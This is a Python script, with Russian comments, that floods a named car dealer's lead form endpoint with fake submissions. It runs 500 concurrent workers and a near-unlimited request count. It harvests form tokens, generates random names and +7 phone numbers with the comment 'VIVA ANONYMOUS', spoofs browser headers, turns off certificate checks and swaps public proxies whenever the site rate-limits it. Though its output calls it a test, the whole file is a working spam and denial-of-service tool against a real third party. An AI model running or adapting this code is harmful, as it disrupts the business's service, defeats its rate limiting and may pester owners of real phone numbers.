import os
import asyncio
import aiohttp
import time
import random, string
import ssl
import sys
import time
import urllib.parse
import urllib.request
import uuid
import aiofiles
from colorama import Fore, Style, init

from datetime import datetime, timezone
from fake_useragent import UserAgent

import aiohttp

from aiohttp_socks import ProxyConnector

TARGET_URL = "https://avto-trak.com/api/leads" 

TOTAL_REQUESTS = 500000000000       # Общее количество запросов
DELAY_BETWEEN_REQ = 0.5      # Пауза перед отправкой следующего запроса в рамках воркера
MAX_CONCURRENT = 500     # Количество параллельных воркеров (потоков)

init(autoreset=True)

URL = "https://avto-trak.com/api/form-token"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json"
}

# Хранилища для анализа данных
seen_ids = set()       # Множество для отслеживания уникальных Telegram ID
duplicate_count = 0    # Счетчик повторений
total_requests = 0     # Общее число сделанных запросов

request_counter = 0
success_count = 0
fail_count = 0
counter_lock = asyncio.Lock()
file_lock = asyncio.Lock()

send_semaphore = asyncio.Semaphore(5)

class ProxyPool:
    def __init__(self):
        self.proxies = []
        self.lock = asyncio.Lock()
        self.is_enabled = False

    async def update_loop(self):
        """Фоновый цикл: обновляет список прокси каждые 7 минут"""
        urls = [
            "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/all/data.txt",
            "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/http.txt",
            "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/socks5.txt"
        ]
        while True:
            for url in urls:
                try:
                    # Скачиваем пул асинхронно через run_in_executor, чтобы не блочить воркеры
                    loop = asyncio.get_running_loop()
                    def fetch():
                        with urllib.request.urlopen(url, timeout=15) as r:
                            return r.read().decode('utf-8')
                    
                    content = await loop.run_in_executor(None, fetch)
                    new_proxies = [line.strip() for line in content.splitlines() if line.strip()]
                    
                    if new_proxies:
                        async with self.lock:
                            self.proxies = new_proxies
                        print(f"\n[🔄 Пул обновлен] Загружено {len(self.proxies)} свежих прокси из внешнего источника.\n")
                        break
                except Exception as e:
                    print(f"[!] Ошибка обновления пула из {url.split('/')[2]}: {e}")
                    continue
            
            await asyncio.sleep(420)

    async def get_proxy(self):
        """Выдает случайный прокси из пула"""
        async with self.lock:
            if self.proxies:
                return random.choice(self.proxies)
            return None

    async def remove_proxy(self, proxy):
        """Удаляет тухлый прокси из актуального списка"""
        async with self.lock:
            if proxy in self.proxies:
                self.proxies.remove(proxy)
                print(f"[❌ Удален тухлый прокси] Осталось в пуле: {len(self.proxies)}")


PROXY_POOL = ProxyPool()

def get_realistic_headers():
    # Набор связок: (User-Agent, платформа, мобильность)
    profiles = [
        # macOS Chrome
        (
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            '"macOS"',
            '?0',
            '"Google Chrome";v="122"'
        ),
        # Windows Chrome
        (
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            '"Windows"',
            '?0',
            '"Google Chrome";v="122"'
        ),
        # iPhone Safari
        (
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
            '"iOS"',
            '?1',
            '"Safari";v="17"'
        )
    ]
    
    ua, platform, mobile, ch_ua = random.choice(profiles)
    
    return {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "ru,en;q=0.9",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Host": "avto-trak.com",
        "Origin": "https://avto-trak.com",
        "Pragma": "no-cache",
        "Referer": "https://avto-trak.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": ua,
        "sec-ch-prefers-color-scheme": random.choice(["dark", "light"]),
        "sec-ch-ua": f'"Not=A?Brand";v="99", {ch_ua}, "Chromium";v="122"',
        "sec-ch-ua-mobile": mobile,
        "sec-ch-ua-platform": platform,
    }



async def send_lead_task(task_id, payload):
    async with send_semaphore:
        """Фоновая задача для отправки POST-запросов с циклом смены прокси и заголовков"""
        while True:
            # Берём новый прокси для каждой итерации отправки
            current_proxy = await PROXY_POOL.get_proxy() if PROXY_POOL.is_enabled else None
            
            # На каждой итерации генерируем новые рандомные заголовки
            headers = get_realistic_headers()
            
            # Настраиваем SSL контекст (игнорируем ошибки верификации)
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE

            # Используем TCPConnector с поддержкой прокси через параметр в post или через ProxyConnector
            # В aiohttp для динамической смены прокси на лету удобнее передавать параметр proxy в session.post или использовать ClientSession с базовым прокси.
            # Поскольку сессия создается на один POST (или переиспользуется), сделаем вызов через ClientSession с нужным коннектором:
            try:
                if current_proxy:
                    proxy_url = current_proxy if "://" in current_proxy else f"http://{current_proxy}"
                    connector = ProxyConnector.from_url(proxy_url, use_dns_cache=True, ttl_dns_cache=3, ssl=ssl_context)
                else:
                    connector = aiohttp.TCPConnector(use_dns_cache=True, ttl_dns_cache=3, ssl=ssl_context)

                timeout = aiohttp.ClientTimeout(total=30)

                try:
                    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                        start_time = time.time()
                        async with session.post(TARGET_URL, json=payload, headers=headers, ssl=ssl_context) as response:
                            duration = time.time() - start_time
                            
                            # Если поймали лимит запросов (429) или ошибку доступа
                            if response.status == 429:
                                print(Fore.YELLOW + f"[!] Фоновая таска {task_id}: Получен статус 429 (Лимит). Меняем IP...")
                                if current_proxy and PROXY_POOL.is_enabled:
                                    await PROXY_POOL.remove_proxy(current_proxy)
                                await asyncio.sleep(1)
                                continue # Переходим к следующей итерации с новым прокси
                                
                            elif response.status in (200, 201):
                                print(Fore.BLUE + f"[+] СООБЩЕНИЕ ОТПРАВЛЕНО (Таска {task_id}) / phone: {payload['phone']} | name: {payload['name']} | Время: {duration:.3f}с")
                                async with counter_lock:
                                    global success_count
                                    success_count += 1
                                break # Успешно отправили — выходим из цикла задачи
                            else:
                                print(Fore.RED + f"[-] Фоновая таска {task_id}: Сервер вернул код {response.status}")
                                async with counter_lock:
                                    global fail_count
                                    fail_count += 1
                                # При ошибке сервера можно попробовать сменить прокси и повторить
                                if current_proxy and PROXY_POOL.is_enabled:
                                    await PROXY_POOL.remove_proxy(current_proxy)
                                await asyncio.sleep(1)
                                
                except (aiohttp.ClientError, asyncio.TimeoutError, ssl.SSLError, OSError) as e:
                    if current_proxy and PROXY_POOL.is_enabled:
                        await PROXY_POOL.remove_proxy(current_proxy)
                    await asyncio.sleep(1)
                    # Цикл продолжит работу со следующим прокси
            except Exception as e:
                if current_proxy and PROXY_POOL.is_enabled:
                    await PROXY_POOL.remove_proxy(current_proxy)
                await asyncio.sleep(1)
                # Цикл продолжит работу со следующим прокси

async def worker(worker_id):
    """Воркер занимается только сбором токенов и порождением фоновых задач отправки"""
    print(f"[*] Воркер {worker_id} запущен.")
    
    # Счётчик для уникальных задач отправки
    task_counter = 0

    while True:
        
        current_proxy = await PROXY_POOL.get_proxy() if PROXY_POOL.is_enabled else None
        
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        if current_proxy:
            proxy_url = current_proxy if "://" in current_proxy else f"http://{current_proxy}"
            connector = ProxyConnector.from_url(proxy_url, use_dns_cache=True, ttl_dns_cache=3, ssl=ssl_context)
        else:
            connector = aiohttp.TCPConnector(use_dns_cache=True, ttl_dns_cache=3, ssl=ssl_context)
      
        timeout = aiohttp.ClientTimeout(total=50) 

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            try:
                global total_requests

                headers = get_realistic_headers()
                
                async with counter_lock:
                    if total_requests >= TOTAL_REQUESTS:
                        break
                    total_requests += 1
                    current_request_num = total_requests

                try:
                    # Получаем токен
                    async with session.get(URL, headers=headers, timeout=10, ssl=ssl_context) as token_response:
                        token_data = await token_response.json()
                        form_token = token_data.get("token", "") 
                        
                        if not form_token:
                            await asyncio.sleep(1)
                            continue

                        print(Fore.GREEN + f"[DEBUG] Воркер {worker_id} получил токен: {form_token}")
                       
                        # Генерируем данные для лида
                        res = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
                        res_2 = ''.join(random.choices(string.ascii_letters, k=3))
                        res_p = ''.join(random.choices(string.digits, k=10))
                        email = "I_AM" + res + "@" + res_2
                        phone = "+7" + res_p

                        payload = {
                            "name": res_2 + " " + res,
                            "phone": phone,
                            "email": email,
                            "comment": "VIVA ANONYMOUS",
                            "car": "Citroën SpaceTourer",
                            "source": "Слайдер на главной",
                            "token": form_token
                        }

                        # ЗАПУСКАЕМ ФОНОВУЮ ТАСКУ НА ОТПРАВКУ И ИДЕМ ДАЛЬШЕ ЗА ТОКЕНАМИ
                        task_counter += 1
                        unique_task_id = f"{worker_id}-{task_counter}"
                        asyncio.create_task(send_lead_task(unique_task_id, payload))

                except (aiohttp.ClientError, asyncio.TimeoutError, ssl.SSLError, OSError) as e:
                    async with counter_lock: 
                        fail_count += 1
                    
                    if current_proxy and PROXY_POOL.is_enabled:
                        await PROXY_POOL.remove_proxy(current_proxy)
                    break

                await asyncio.sleep(DELAY_BETWEEN_REQ)
                
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                if current_proxy:
                    await PROXY_POOL.remove_proxy(current_proxy)
                await asyncio.sleep(1)
                continue 
              
            except Exception as e:
                await asyncio.sleep(1)
                continue
async def main():
    print(f"[*] Запуск асинхронного теста для: {TARGET_URL}")
    print(f"[*] Всего запросов: {TOTAL_REQUESTS}, Одновременных воркеров: {MAX_CONCURRENT}\n")
  
    if os.getenv("PROXY_URL"):
        PROXY_POOL.proxies = [os.getenv("PROXY_URL")]
        PROXY_POOL.is_enabled = True
        print("[*] Используется фиксированный прокси из Docker окружения.")
    elif len(sys.argv) > 1 and sys.argv[1].lower() == "proxy":
        PROXY_POOL.is_enabled = True
        asyncio.create_task(PROXY_POOL.update_loop())
        print("[*] Включен режим динамического пула прокси. Ожидание первой загрузки...")        
        while not PROXY_POOL.proxies:
            await asyncio.sleep(1)

    workers = [
        asyncio.create_task(worker(worker_id))
        for worker_id in range(1, MAX_CONCURRENT + 1)
    ]

    await asyncio.gather(*workers)

    print("\n--- Итоги тестирования ---")
    print(f"Успешных запросов: {success_count}")
    print(f"Ошибок/сбоев: {fail_count}")

if __name__ == "__main__":
    import sys
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
    asyncio.run(main())





